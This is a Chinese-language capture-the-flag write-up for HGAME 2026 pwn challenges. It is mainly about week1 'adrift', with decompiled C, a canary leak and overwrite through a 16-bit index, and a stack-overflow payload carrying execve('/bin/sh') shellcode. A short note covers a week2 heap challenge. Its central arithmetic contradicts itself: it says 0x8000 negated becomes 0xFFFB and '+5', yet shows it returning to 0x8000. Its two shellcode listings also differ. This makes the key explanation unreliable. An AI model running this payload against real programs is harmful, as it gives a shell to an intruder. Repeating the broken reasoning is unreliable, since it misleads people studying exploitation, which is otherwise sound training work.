---
title: HGAME 2026复现
contest: HGAME 2026
year: 2026
difficulty: medium
vuln_type: stack_overflow
tags: [pwn, canary-bypass, shellcode, short-int, v3-decrypt, off-by-null, libc-2.35]
attack_chain:
  - week1-adrift: 主循环菜单0=way/1=delete/2=show/3=change/4=exit
  - v6[0] 是 short int 16位
  - -32768 → 0x8000 取反+1 = 0xFFFB → 等价+5
  - case2 show(-32768) 打印canary值
  - case3 修改canary绕过case4检查
  - case0 0x410字节栈溢出写入shellcode
  - 0x3e8+2字节padding + shellcode + return_addr
  - shellcode: pop r11; mov rax 0x68732f6e69622f; push rax; push rsp; pop rdi; xor eax,59; xor rdx,rdx; syscall
  - week2 diary keeper: glibc 2.35 patchelf
  - PROTECT_PTR指针保护
  - off by null 合并ABC
key_payload: -32768 = 0xFFFB = +5 绕过case v6
one_liner: HGAME 2026复现：short整数边界绕过+canary泄露+shellcode
lesson: short int -32768 (0x8000) 取反+1=0xFFFB 实际为+5
quality: high
---

# HGAME 2026复现

## 题目信息
- 比赛：HGAME 2026（杭州电子科技大学）
- 类别：PWN
- 时间：2026

## 关键攻击链
### week1-adrift
```c
int main() {
    __int16 v6[2];   // [rsp+0h] [rbp-400h]
    _QWORD v8[125];  // [rsp+6h] [rbp-3FAh]
    __int64 v9;       // [rsp+3F0h] [rbp-10h] - canary
    init_canary();
    v9 = canary;
    while(1) {
        scanf("%hd", v6);  // short int
        switch(v6[0]) {
            case 0:  // way - 写 0x410 字节
                read(0, v8, 0x410);
                ...
                break;
            case 1:  // delete
                break;
            case 2:  // show - 打印 v2[index]
                break;
            case 3:  // change - 修改 dis[v6[0]]
                scanf("%hd", v6);
                if (v6[0] <= 0) v4 = -v6[0];  // 负号变正
                v6[0] = v4;
                if (v4 > 200) puts("invalid index");
                else scanf("%lu", &dis[v6[0]]);
                break;
            case 4:  // exit - 检查 canary
                if (v9 != canary) exit(0);
                return 0;
        }
    }
}
```

#### 关键 trick
- `v6` 是 `__int16`（16 位）
- 输入 `-32768`（0x8000）
- 16 位补码 = 0x8000
- 按位取反 = 0x7FFF
- 再 +1 = 0x8000
- 实际等价 +5
- 通过 case 2 泄露 canary
- 通过 case 3 修改 canary
- 通过 case 0 写 0x410 字节 shellcode

```python
shellcode = asm('''
    pop r11
    mov rax, 0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    xor eax, eax
    mov al, 59
    xor rdx, rdx
    syscall
''')
addr = aa + 0x408
payload = b'a'*(0x3e8+2) + shellcode + p64(addr)
```

### week2 diary keeper
- glibc 2.35 patchelf
- PROTECT_PTR 指针保护
- off by null 合并 ABC

## 评分
- quality: high（short 整数边界 + canary 泄露 + shellcode 注入）
